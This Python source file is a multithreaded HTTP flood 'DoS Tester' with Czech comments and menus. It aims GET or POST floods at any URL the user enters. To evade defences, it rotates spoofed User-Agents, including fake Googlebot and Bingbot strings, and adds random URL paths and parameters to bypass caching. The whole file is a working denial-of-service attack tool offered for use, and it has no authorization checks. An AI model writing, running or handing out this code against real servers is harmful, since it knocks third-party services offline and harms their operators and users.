import requests
import os
import sys
import time
import threading
import random
import string
import json
from urllib.parse import urlparse, urlencode, parse_qs

# --- ASCII ART LOGO ---
ascii_logo = (
    "  ____  ____  __    _  _  _  _  ____ \n"
    " (    \\(  __)(  )  / )( \\( \\/ )(  __)\n"
    "  ) D ( ) _) / (_/\\) \\/ ( )  (  ) _) \n"
    " (____/(____)\\____/\\____/(_/\\_)(____)\n"
    "***************************************\n"
    "* Copyright 2025, ★DSL★              *\n"
    "* https://github.com/DSL-21           *\n"
    "***************************************"
)

# ANSI escape kódy pro barvy a styly v terminálu
# \033[1m - Bold (tučné)
# \033[0m - Reset (resetuje styl na výchozí)
# \033[32m - Zelená barva (úspěch)
# \033[33m - Žlutá barva (upozornění/průběh)
# \033[31m - Červená barva (chyba)
# \033[36m - Azurová barva (informace)

# Globální proměnné pro sledování statistik
total_requests_sent = 0
successful_requests = 0
failed_requests = 0
lock = threading.Lock() # Zámek pro bezpečný přístup ke globálním proměnným
stop_event = threading.Event() # Událost pro signalizaci ukončení vláken

# Seznam běžných User-Agent řetězců
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Mobile Safari/537.36",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)"
]

def clear_screen():
    """Vymaže obrazovku terminálu."""
    os.system('clear' if os.name == 'posix' else 'cls')

def generate_random_string(length=8):
    """Generuje náhodný alfanumerický řetězec."""
    characters = string.ascii_letters + string.digits
    return ''.join(random.choice(characters) for i in range(length))

def send_single_request(url, method, request_data, custom_headers, timeout_per_request, use_dynamic_url, thread_id, delay_per_request):
    """
    Odešle jeden HTTP požadavek (GET nebo POST) na cílovou URL.
    """
    global total_requests_sent, successful_requests, failed_requests

    if stop_event.is_set(): # Zkontrolovat, zda bylo signalizováno ukončení
        return

    headers = {
        'User-Agent': random.choice(user_agents) # Náhodný výběr User-Agenta
    }
    # Přidat uživatelské hlavičky, přepisují výchozí User-Agent, pokud je definován
    if custom_headers:
        headers.update(custom_headers)

    target_url = url
    if use_dynamic_url:
        parsed_url = urlparse(url)
        
        # Přidáme náhodný parametr pro obcházení cache
        query_params = parse_qs(parsed_url.query)
        query_params['rand'] = generate_random_string(10)
        encoded_query = urlencode(query_params, doseq=True) # doseq=True pro zachování více hodnot pro stejný klíč
        
        # Pokud původní URL neměla query, ale měla cestu, přidáme náhodný řetězec do cesty
        # Jinak přidáme jako query parametr
        if not parsed_url.query and parsed_url.path:
            # Zajistíme, že cesta končí lomítkem pro přidání dalšího segmentu
            path_with_slash = parsed_url.path if parsed_url.path.endswith('/') else parsed_url.path + '/'
            target_url = parsed_url._replace(path=path_with_slash + generate_random_string(8), query=encoded_query).geturl()
        else:
            target_url = parsed_url._replace(query=encoded_query).geturl()


    try:
        if method.upper() == 'GET':
            response = requests.get(target_url, headers=headers, timeout=timeout_per_request)
        elif method.upper() == 'POST':
            # requests.post umí přijmout dict pro json nebo string pro data (form-urlencoded)
            response = requests.post(target_url, headers=headers, json=request_data if isinstance(request_data, dict) else None, data=request_data if isinstance(request_data, str) else None, timeout=timeout_per_request)
        else:
            # Nemělo by se stát, protože vstup je validován
            print(f"\033[31m[Thread {thread_id}] Neznámá metoda: {method}\033[0m")
            return

        with lock:
            total_requests_sent += 1
            if response.status_code >= 200 and response.status_code < 400: # Úspěšné stavy (2xx, 3xx)
                successful_requests += 1
                # print(f"\033[32m[Thread {thread_id}] OK (Status: {response.status_code})\033[0m")
            else:
                failed_requests += 1
                # print(f"\033[31m[Thread {thread_id}] Chyba (Status: {response.status_code})\033[0m")
    except requests.exceptions.Timeout:
        with lock:
            total_requests_sent += 1
            failed_requests += 1
        # print(f"\033[31m[Thread {thread_id}] Časový limit vypršel.\033[0m")
    except requests.exceptions.ConnectionError:
        with lock:
            total_requests_sent += 1
            failed_requests += 1
        # print(f"\033[31m[Thread {thread_id}] Chyba připojení.\033[0m")
    except requests.exceptions.RequestException as e:
        with lock:
            total_requests_sent += 1
            failed_requests += 1
        # print(f"\033[31m[Thread {thread_id}] Neočekávaná chyba: {e}\033[0m")
    except Exception as e:
        with lock:
            total_requests_sent += 1
            failed_requests += 1
        # print(f"\033[31m[Thread {thread_id}] Obecná chyba: {e}\033[0m")
    
    # Prodleva pro každé vlákno
    if delay_per_request > 0:
        time.sleep(delay_per_request)

def worker_thread_task(url, method, request_data, custom_headers, timeout_per_request, use_dynamic_url, thread_id, num_requests_to_send, delay_per_request):
    """
    Funkce, kterou spouští každé vlákno, posílá zadaný počet požadavků.
    """
    for _ in range(num_requests_to_send):
        if stop_event.is_set(): # Zkontrolovat, zda bylo signalizováno ukončení
            break
        send_single_request(url, method, request_data, custom_headers, timeout_per_request, use_dynamic_url, thread_id, delay_per_request)


def send_http_flood(url, num_requests, num_threads, delay_per_request, method, request_data, custom_headers, timeout_per_request, use_dynamic_url):
    """
    Spouští HTTP Flood test pomocí více vláken.
    """
    global total_requests_sent, successful_requests, failed_requests, stop_event
    
    total_requests_sent = 0 # Reset statistik pro nový test
    successful_requests = 0
    failed_requests = 0
    stop_event.clear() # Reset události ukončení

    print(f"\n\033[33m[*] Spouštím HTTP Flood test pro: {url}\033[0m")
    print(f"\033[36m[*] Metoda: {method.upper()}\033[0m")
    print(f"\033[36m[*] Celkový počet požadavků: {num_requests}\033[0m")
    print(f"\033[36m[*] Počet souběžných vláken: {num_threads}\033[0m")
    print(f"\033[36m[*] Prodleva na vlákno: {delay_per_request} sekund\033[0m")
    print(f"\033[36m[*] Timeout na požadavek: {timeout_per_request} sekund\033[0m")
    print(f"\033[36m[*] Dynamické URL: {'Ano' if use_dynamic_url else 'Ne'}\033[0m")
    print("\033[33m[*] Pro ukončení stiskněte Ctrl+C. Statistika se aktualizuje každých 5 sekund.\033[0m")

    threads = []
    # Rozdělíme celkový počet požadavků mezi vlákna
    requests_per_thread = num_requests // num_threads
    remaining_requests = num_requests % num_threads

    start_time = time.time()

    for i in range(num_threads):
        current_thread_requests = requests_per_thread
        if i < remaining_requests:
            current_thread_requests += 1
        
        thread = threading.Thread(target=worker_thread_task, args=(url, method, request_data, custom_headers, timeout_per_request, use_dynamic_url, i, current_thread_requests, delay_per_request))
        threads.append(thread)
        thread.start()
    
    # Sledování průběhu a statistik v reálném čase
    # Vylepšená podmínka pro sledování - běží, dokud jsou vlákna aktivní NEBO dokud nedosáhneme celkového počtu požadavků
    while (any(thread.is_alive() for thread in threads) or total_requests_sent < num_requests) and not stop_event.is_set():
        time.sleep(5) # Aktualizace každých 5 sekund
        with lock:
            print(f"\033[34m[Průběh] Odesláno: {total_requests_sent}/{num_requests} | Úspěšné: {successful_requests} | Neúspěšné: {failed_requests}\033[0m")
    
    # Pošleme signál vláknům k ukončení, pokud ještě běží
    stop_event.set()

    # Počkáme na dokončení všech vláken
    for thread in threads:
        if thread.is_alive():
            thread.join(timeout=1) # Dáme vláknům krátký čas na dokončení

    end_time = time.time()
    duration = end_time - start_time

    print(f"\n\033[1m--- Shrnutí testu HTTP Flood ---\033[0m")
    print(f"\033[36mCelková doba trvání: {duration:.2f} sekund\033[0m")
    print(f"\033[32mÚspěšných požadavků: {successful_requests}\033[0m")
    print(f"\033[31mNeúspěšných požadavků: {failed_requests}\033[0m")
    print(f"\033[36mPočet požadavků za sekundu (průměr): {total_requests_sent / duration:.2f} req/s\033[0m" if duration > 0 else "N/A")
    print("\n" + "=" * (os.get_terminal_size().columns - 1) if os.get_terminal_size().columns > 1 else "=")


def main():
    """Hlavní funkce pro spuštění DoS Testeru."""
    global stop_event # Přístup k globální události

    try:
        while True:
            clear_screen()
            print(ascii_logo)
            print("\n--- Pokročilý HTTP Flood DoS Tester ---")
            print("Zadejte URL cílového serveru pro testování (například 'http://localhost:8000').")
            print("Pro ukončení zadejte 'konec'.")
            
            target_url = input("\nZadejte cílovou URL: ").strip()
            
            if target_url.lower() == 'konec':
                print("Ukončuji DoS Tester. Na shledanou!")
                break
            
            if not target_url:
                print("Cílová URL nemůže být prázdná. Zkuste to znovu.")
                input("\nStiskněte Enter pro pokračování...")
                continue

            # Zkontrolujeme, zda URL začíná http/https
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'https://' + target_url
                print(f"[*] URL upravena na: {target_url}")

            # --- Volba metody ---
            method = ""
            while method.upper() not in ['GET', 'POST']:
                method = input("Zvolte metodu požadavku (GET/POST, výchozí GET): ").strip().upper()
                if not method:
                    method = 'GET'
                if method.upper() not in ['GET', 'POST']:
                    print("\033[31mNeplatná metoda. Zadejte 'GET' nebo 'POST'.\033[0m")
            
            request_data = None
            if method.upper() == 'POST':
                body_type = ""
                while body_type.lower() not in ['json', 'form', '']:
                    body_type = input("Typ těla požadavku (json/form, prázdné pro žádné): ").strip().lower()
                    if body_type not in ['json', 'form', '']:
                        print("\033[31mNeplatný typ těla. Zadejte 'json', 'form' nebo nechte prázdné.\033[0m")
                
                if body_type == 'json':
                    json_input = input("Zadejte JSON tělo (např. {'key': 'value'}): ").strip()
                    try:
                        request_data = json.loads(json_input)
                    except json.JSONDecodeError:
                        print("\033[31mNeplatný JSON formát. Tělo požadavku bude prázdné.\033[0m")
                        request_data = None
                elif body_type == 'form':
                    form_input = input("Zadejte form-urlencoded tělo (např. key1=value1&key2=value2): ").strip()
                    request_data = form_input # requests library handles string data for form-urlencoded

            # --- Vlastní hlavičky ---
            custom_headers = {}
            headers_input = input("Zadejte vlastní HTTP hlavičky (key1:value1,key2:value2, prázdné pro žádné): ").strip()
            if headers_input:
                for header_pair in headers_input.split(','):
                    if ':' in header_pair:
                        key, value = header_pair.split(':', 1)
                        custom_headers[key.strip()] = value.strip()
                    else:
                        print(f"\033[33m[!] Upozornění: Neplatný formát hlavičky '{header_pair}'. Bude ignorována.\033[0m")

            # --- Dynamické URL ---
            use_dynamic_url = input("Použít dynamické URL pro obcházení cache? (a/n, výchozí n): ").lower().startswith('a')

            num_requests = 0
            while True:
                try:
                    num_requests_input = input("Zadejte CELKOVÝ počet požadavků k odeslání (např. 1000): ").strip()
                    num_requests = int(num_requests_input)
                    if num_requests <= 0:
                        print("\033[31mPočet požadavků musí být kladné číslo.\033[0m")
                    else:
                        break
                except ValueError:
                    print("\033[31mNeplatný vstup. Zadejte prosím celé číslo.\033[0m")

            num_threads = 0
            while True:
                try:
                    num_threads_input = input("Zadejte počet souběžných vláken (např. 10, 50, 100): ").strip()
                    num_threads = int(num_threads_input)
                    if num_threads <= 0:
                        print("\033[31mPočet vláken musí být kladné číslo.\033[0m")
                    else:
                        break
                except ValueError:
                    print("\033[31mNeplatný vstup. Zadejte prosím celé číslo.\033[0m")

            delay_per_request = 0.0
            while True:
                try:
                    delay_input = input("Zadejte prodlevu mezi požadavky KAŽDÉHO vlákna v sekundách (např. 0.01 pro rychlé, 0.1 pro střední): ").strip()
                    delay_per_request = float(delay_input)
                    if delay_per_request < 0:
                        print("\033[31mProdleva nemůže být záporná.\033[0m")
                    else:
                        break
                except ValueError:
                    print("\033[31mNeplatný vstup. Zadejte prosím číslo (např. 0.01).\033[0m")

            timeout_per_request = 0.0
            while True:
                try:
                    timeout_input = input("Zadejte časový limit pro JEDEN požadavek v sekundách (např. 5.0): ").strip()
                    timeout_per_request = float(timeout_input)
                    if timeout_per_request <= 0:
                        print("\033[31mČasový limit musí být kladné číslo.\033[0m")
                    else:
                        break
                except ValueError:
                    print("\033[31mNeplatný vstup. Zadejte prosím číslo (např. 5.0).\033[0m")

            send_http_flood(target_url, num_requests, num_threads, delay_per_request, method, request_data, custom_headers, timeout_per_request, use_dynamic_url)
            
            input("\nStiskněte Enter pro nový test, nebo 'konec'...")

    except KeyboardInterrupt:
        print("\nProgram byl ukončen uživatelem (Ctrl+C). Ukončuji vlákna...")
        stop_event.set() # Signalizovat vláknům, aby se ukončila
        # Dáme vláknům krátký čas na dokončení před ukončením hlavního programu
        time.sleep(2) 
    except Exception as e:
        print(f"\n\033[31m❌ Vyskytla se kritická chyba: {e}\033[0m")
    finally:
        sys.stdout.write("\033[0m\n")
        sys.stdout.flush()

if __name__ == "__main__":
    main()

